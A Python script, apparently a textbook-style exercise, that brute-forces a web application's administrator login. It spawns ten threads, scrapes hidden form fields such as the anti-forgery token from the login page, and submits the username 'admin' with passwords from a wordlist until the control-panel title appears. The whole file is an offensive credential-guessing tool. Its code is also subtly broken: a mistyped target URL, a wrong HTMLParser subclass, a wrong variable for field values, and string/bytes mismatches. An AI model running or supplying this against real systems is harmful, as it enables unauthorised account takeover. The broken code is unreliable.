import urllib3
import urllib
from urllib import request, parse
import threading
import HTMLParser
import sys
import queue
import html.parser
import http.cookiejar
from BruteForceContent import buildWords

noThreads = 10

# set username, wordslist here and then run
username = "admin"
wordsFile = "/tmp/cain.txt"

resume = None

# where script will donload and parse HTML
targetAddr = "http://192.168.112.131/administrator/index/php"
# where we will submit brute-forcing attempt
targetSubmit = "http://192.168.112.131/administrator/index.php"

username_field = "username"
password_field = "passwd"

# string to check for to see if we are successful
successString = "Administration - Control Panel"


class Bruter:
    def __init__(self, username, words):
        self.username = username
        self.password_q = words
        self.found = False

        print("Finished setting up for: %s" % username)

    def startThreads(self):

        for i in range(noThreads):
            t = threading.Thread(target=self.bruteWebs)
            t.start()

    def bruteWebs(self):

        while not self.password_q.empty() and not self.found:
            brute = self.password_q.get().rstrip()

            # create CookieJar to store all cookies
            jar = http.cookiejar.FileCookieJar("Cookies")

            # pass any cookies to cookie jar
            opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))

            # initial request to get login form
            response = opener.open(targetAddr)
            page = response.read()

            print("Trying %s : %s (%d left)" % (self.username, brute, self.password_q.qsize()))

            # parse on hidden fields
            parser = BruteParser()
            parser.feed(page)

            post_tags = parser.tag_results

            post_tags[username_field] = self.username
            post_tags[password_field] = brute

            login_data = urllib.parse.urlencode(post_tags)
            login_response = opener.open(targetSubmit, login_data)

            login_result = login_response.read()

            if successString in login_result:
                self.found = True

                print("[*] Bruteforce successfull.")
                print("[*] Username: %s" % username)
                print("[*] Password: %s" % brute)
                print("[*] Waiting for all threads to finish...")


class BruteParser(HTMLParser):
    def __init__(self):
        HTMLParser.__init__(self)
        # dictionary to store results
        self.tag_results = {}

    def handle_starttag(self, tag, attrs):
        if tag == "input":
            tag_name = None
            tag_value = None
            for name, value in attrs:
                if name == "name":
                    tag_name = value
                if name == "value":
                    tag_value = value

            if tag_name is not None:
                self.tag_results[tag_name] = value


words = buildWords(wordsFile)

bruter_obj = Bruter(username, words)
bruter_obj.startThreads()
